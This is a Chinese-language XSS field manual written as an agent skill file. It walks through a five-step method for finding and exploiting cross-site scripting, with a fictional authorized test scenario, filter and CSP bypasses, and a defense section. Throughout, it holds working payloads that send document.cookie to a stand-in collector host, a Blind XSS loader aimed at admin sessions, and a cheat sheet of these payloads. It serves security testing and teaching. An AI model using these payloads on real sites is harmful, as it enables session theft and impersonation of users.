---
source: test008008008008-glitch/web-security-skills
skill: 02-xss
fused: 2026-09-17
method: 五步猎洞法
---

---
name: xss
description: XSS 跨站脚本实战手册。当用户可控内容进入 HTML/属性/JS/URL 语境，或需要验证、利用、绕过 CSP 与过滤器时使用。
---

# 第二技 · XSS —— 站在用户浏览器里的一行代码

> 猎手视角：XSS 不是"弹个窗"，而是你借服务器之手，把代码送进了**别人的浏览器会话**——那里有 Cookie、有 DOM、有用户的每一次点击。

**目标读者**：具备基础 Web 测试经验的安全工程师
**前置要求**：理解 HTML/JS 基础、浏览器同源策略、Burp/浏览器开发者工具

---

## 何时启用本技

- 评论、昵称、签名等**用户内容回显点**
- 站内信、工单、举报等**后台管理员会看到**的输入（潜在 Blind XSS 高价值位）
- 文件名、错误页、搜索词回显
- URL 参数被写入页面或 `location.hash` 被 JS 读取（DOM 型）
- 富文本编辑器、Markdown 渲染、邮件模板预览

---

## 一、原理拆解

三种类型的本质区别：

| 类型 | 数据流向 | 根因 |
|------|----------|------|
| 反射型 | 请求参数 → 即时回显到响应 | 服务端输出未编码 |
| 存储型 | 入库 → 他人访问时回显 | 同上 + 持久化放大 |
| DOM 型 | 参数 → 前端 JS 读取 → 写入 DOM | 前端 sink 未编码，全程不经过服务端 |

**语境决定一切**：同一个 `<script>` 标签，在 HTML body 里能执行，落进 `value=''` 属性里要先逃逸引号，进 `<script>` 字符串里要逃逸 JS 引号。先定位语境，再选 payload——顺序反了就是无脑扫 payload 的脚本小子。

---

## 二、五步猎洞法

### 第一步：识面 —— 找"进得去又出得来"的参数

筛选条件：输入后**在响应源码中能找到回显**（反射型/存储型），或被 `document.location`、`innerHTML` 等 sink 读取（DOM 型，看 JS 源码与 Sources 面板）。

### 第二步：定点 —— 语境探测

用一串**带唯一标记的多语探针**，一次看清自己落在哪：

```text
probez1"><img src=x onerror=alert(1)>probez2
```

回显处上下文六种语境与破法：

| 语境 | 示例回显 | 破法 |
|------|----------|------|
| HTML body | `<div>probe</div>` | 直接 `<script>` 或事件标签 |
| 双引号属性 | `<input value="probe">` | `"><img...>` 先闭属性再闭标签 |
| 单引号属性 | `value='probe'` | `'><img...>` |
| 无引号属性 | `value=probe` | 空格断开后 `onerror=` |
| `<script>` 内 | `var q = "probe"` | `";alert(1);//` 逃 JS 字符串 |
| 注释里 | `<!-- probe -->` | `--><script>` 先出注释 |

### 第三步：验证 —— 超越 alert

证明"能执行任意 JS"而不是只证明"能 alert"：

```js
// 外带回调（证明可读取页面上下文）
fetch('https://<你的收集域>/?c='+document.cookie)
// 打印环境（证明 JS 语境完整性）
console.log(document.domain, localStorage)
```

浏览器弹 alert 需人工在场；外带探针让验证可自动化、可留证。

### 第四步：利用 —— 按目标画像选武器

- **窃取会话**：`document.cookie` 外带（无 HttpOnly 时）
- **操作用户**：以其身份发请求（改绑邮箱、下单、转账），CSRF 防不住 XSS，因为请求同源且带全部凭据
- **键盘记录**：监听 `keydown` 外带
- **Blind XSS**：向"只有管理员看"的字段（工单标题、UA、日志查看器）投 `document.location='https://<收集域>/?b='+document.cookie` 的 loader，等管理员打开后台那刻收获管理员会话
- **打内网**：从用户浏览器发内网探测（用户在内网时）

### 第五步：收官 —— 评估真实影响面

确认执行 → 记录影响（能拿到什么、能操作什么）→ 立即报告。存储型 XSS 报告里写清楚触发链路（入口页 → 受害页），别让开发复现半天。

---

## 三、实战推演（虚构场景）

> 场景：授权测试虚构社区 `bbs.demo-example.com`，评论区支持昵称展示

1. **识面**：昵称 `nickname` 在所有评论旁回显——存储型候选
2. **定点**：提交昵称 `probez"><img src=x onerror=alert(1)>`，查看渲染后 DOM：昵称落在 `<a title="...">` 属性内
3. **验证**：改 payload 为 `"><img src=x onerror=fetch('https://log.example/?c='+document.cookie)>`，收数平台收到回连，属性逃逸成功
4. **利用**：Cookie 带 `HttpOnly`——转向"操作用户"：payload 改为以当前用户身份静默关注指定账号并点赞，证明可冒充操作
5. **收官**：报告写明"存储型 XSS → 可冒充任意浏览该帖用户执行操作"，建议输出编码修复

---

## 四、对抗与绕过

| 防线 | 破解思路 |
|------|----------|
| 黑名单 `<script>` | 用事件型：`<img/src=x onerror=...>`、`<svg onload=...>`、`<body onpageshow=...>` |
| 过滤括号/引号 | `location=name`（name 属性跨页传参） |
| DOMPurify 等净化器 | 保持更新版本；绕过多发生在配置错误（允许 `data:`、MATHML）而非库本身 |
| CSP script-src | 看 nonce 泄漏、JSONP 端点、`unsafe-eval`、dangling-markup |
| 编码语境双跳 | 输出进 JS 再由 JS 写入 HTML：双重编码里找一次解码点 |

CSP 侦察：读 `Content-Security-Policy` 头逐条分析，找 allowlist 里可被劫持的域（CDN 上有开放上传、过期 JSONP）。

---

## 五、防御视角

1. **按语境输出编码**：HTML 实体、属性编码、JS 编码、URL 编码，模板引擎自动转义项不要手工关闭
2. **富文本白名单**：DOMPurify + 白名单标签集，禁属性 `on*`/`style`/`href=javascript:`
3. Cookie 全面 `HttpOnly` + `Secure` + `SameSite`
4. 严格 CSP（nonce 而非 allowlist 优先）
5. DOM sink 审计清单：`innerHTML`、`document.write`、`eval`、`setTimeout(str)`、`location.href=` 用户可控即查

---

## 六、踩坑记录

- 富文本过滤"肉眼看起来都拦了"，但 **HTML 实体化在属性语境下二次解码**，漏过一层
- DOM 型 XSS 用 Burp 扫不出来（响应里根本没有 payload）——要看**浏览器渲染后的 DOM**，Sources 面板断在 sink 上
- Chrome 的 XSS Auditor 已移除，别再用"浏览器没弹=被拦"的旧结论；同理别信"HTML5 新标签过滤器认识所有标签"
- `alert` 在 headless/无头环境无感知，自动化验证一律用外带回连
- 存储型 payload 要**先清缓存再验证**，否则你以为修复失效，其实是 CDN 在回旧页

---

## 七、速查卡

```text
探针:   probez"><img src=x onerror=alert(1)>
语境:   body直接插 | 属性先逃引号 | JS内逃";注释收尾
事件:   onerror onload onpageshow onfocus=autofocus
绕过:   无引号属性断空格 | location=name | 编码双跳
盲打:   投到管理员可见字段, loader等收割
外带:   fetch('https://log/?c='+document.cookie)
```
